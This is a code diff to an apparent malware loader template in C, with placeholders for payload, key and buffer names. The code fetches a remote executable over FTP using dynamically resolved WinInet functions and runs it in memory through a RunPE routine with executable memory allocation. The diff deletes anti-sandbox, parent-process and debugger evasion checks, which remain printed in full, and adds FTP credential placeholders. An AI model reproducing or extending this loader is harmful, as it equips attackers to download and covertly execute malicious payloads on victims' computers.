@@ -11,7 +11,7 @@
 #pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "user32.lib")
 
-// Forward declarations:
+// Forward declarations
 int DL();
 BOOL RunPE(unsigned char *pExeBuffer, size_t nSize);
 
@@ -20,6 +20,8 @@ size_t payload_len = {{PAYLOAD_SIZE}};
 char key[] = {{KEY}};
 char enc_algo[] = {{ENC_ALGO}};
 char payload_type[] = {{PAYLOAD_TYPE}};
+char FTP_USER[] = "{{FTP_USER}}";
+char FTP_PASS[] = "{{FTP_PASS}}";
 
 wchar_t PROTOCOL[10];
 wchar_t IP[50];
@@ -61,72 +63,39 @@ void decrypt_payload(unsigned char *data, size_t data_len) {
     }
 }
 
-int is_sandbox_user() {
-    char username[256] = {0};
-    DWORD size = sizeof(username);
-    GetUserNameA(username, &size);
-    return (strstr(username, "sandbox") || strstr(username, "admin") || strstr(username, "test")) ? 1 : 0;
-}
-
-int check_parent() {
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
-    DWORD ppid = 0, mypid = GetCurrentProcessId();
-    if (Process32First(hSnap, &pe32)) {
-        do {
-            if (pe32.th32ProcessID == mypid) {
-                ppid = pe32.th32ParentProcessID;
-                break;
-            }
-        } while (Process32Next(hSnap, &pe32));
-    }
-    CloseHandle(hSnap);
-    HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ppid);
-    CHAR parentName[MAX_PATH] = "";
-    if (hParent) {
-        HMODULE hMod;
-        DWORD cbNeeded;
-        if (EnumProcessModules(hParent, &hMod, sizeof(hMod), &cbNeeded))
-            GetModuleBaseNameA(hParent, hMod, parentName, sizeof(parentName));
-        CloseHandle(hParent);
-    }
-    return _stricmp(parentName, "explorer.exe") != 0;
-}
-
-void noise() {
-    WIN32_FIND_DATA findData;
-    HANDLE hFind = FindFirstFileA("C:\\Windows\\*", &findData);
-    int count = 0;
-    if (hFind != INVALID_HANDLE_VALUE) {
-        do { if (++count > 10) break; } while (FindNextFileA(hFind, &findData));
-        FindClose(hFind);
-    }
-}
-
 int DL() {
+    printf("[*] Inside DL() FTP downloader\n");
     HMODULE hWinInet = LoadLibraryA("wininet.dll");
     if (!hWinInet) return 0;
+
     typedef HINTERNET(WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
     typedef HINTERNET(WINAPI *pInternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
     typedef HINTERNET(WINAPI *pFtpOpenFileA)(HINTERNET, LPCSTR, DWORD, DWORD, DWORD_PTR);
     typedef BOOL(WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
     typedef BOOL(WINAPI *pInternetCloseHandle)(HINTERNET);
+
     pInternetOpenA InternetOpenA_ = (pInternetOpenA)GetProcAddress(hWinInet, "InternetOpenA");
     pInternetConnectA InternetConnectA_ = (pInternetConnectA)GetProcAddress(hWinInet, "InternetConnectA");
     pFtpOpenFileA FtpOpenFileA_ = (pFtpOpenFileA)GetProcAddress(hWinInet, "FtpOpenFileA");
     pInternetReadFile InternetReadFile_ = (pInternetReadFile)GetProcAddress(hWinInet, "InternetReadFile");
     pInternetCloseHandle InternetCloseHandle_ = (pInternetCloseHandle)GetProcAddress(hWinInet, "InternetCloseHandle");
+
     char ipA[100], pathA[100];
     wcstombs(ipA, IP, sizeof(ipA));
     wcstombs(pathA, PATH, sizeof(pathA));
+
     HINTERNET hInternet = InternetOpenA_("MyFTPStub/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) return 0;
-    HINTERNET hFtp = InternetConnectA_(hInternet, ipA, INTERNET_DEFAULT_FTP_PORT, "anonymous", "", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
+
+    HINTERNET hFtp = InternetConnectA_(hInternet, ipA, INTERNET_DEFAULT_FTP_PORT, FTP_USER, FTP_PASS, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
     if (!hFtp) { InternetCloseHandle_(hInternet); return 0; }
+
     HINTERNET hFile = FtpOpenFileA_(hFtp, pathA, GENERIC_READ, FTP_TRANSFER_TYPE_BINARY, 0);
     if (!hFile) { InternetCloseHandle_(hFtp); InternetCloseHandle_(hInternet); return 0; }
+
     unsigned char tempBuf[4096]; DWORD bytesRead = 0;
     {{SIZE_NAME}} = {{CAPACITY_NAME}} = 0;
+
     while (InternetReadFile_(hFile, tempBuf, sizeof(tempBuf), &bytesRead) && bytesRead > 0) {
         if ({{SIZE_NAME}} + bytesRead > {{CAPACITY_NAME}}) {
             {{CAPACITY_NAME}} = ({{CAPACITY_NAME}} == 0) ? 8192 : {{CAPACITY_NAME}} * 2;
@@ -136,11 +105,14 @@ int DL() {
         memcpy({{BUF_NAME}} + {{SIZE_NAME}}, tempBuf, bytesRead);
         {{SIZE_NAME}} += bytesRead;
     }
+
     InternetCloseHandle_(hFile); InternetCloseHandle_(hFtp); InternetCloseHandle_(hInternet);
+    printf("[*] FTP download completed successfully\n");
     return 1;
 }
 
 BOOL RunPE(unsigned char *pExeBuffer, size_t nSize) {
+    printf("[*] Inside RunPE()\n");
     PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pExeBuffer;
     PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pExeBuffer + pDos->e_lfanew);
     LPVOID pImage = VirtualAlloc(NULL, pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -210,9 +182,6 @@ int main() {
 
     Sleep(10000);
     printf("[*] Post splash delay complete.\n");
-
-    if (IsDebuggerPresent()) { printf("[!] Debugger detected.\n"); ExitProcess(0); }
-    printf("[*] Debugger check passed.\n");
 
     unsigned char *final_payload = NULL;
     size_t final_size = 0;
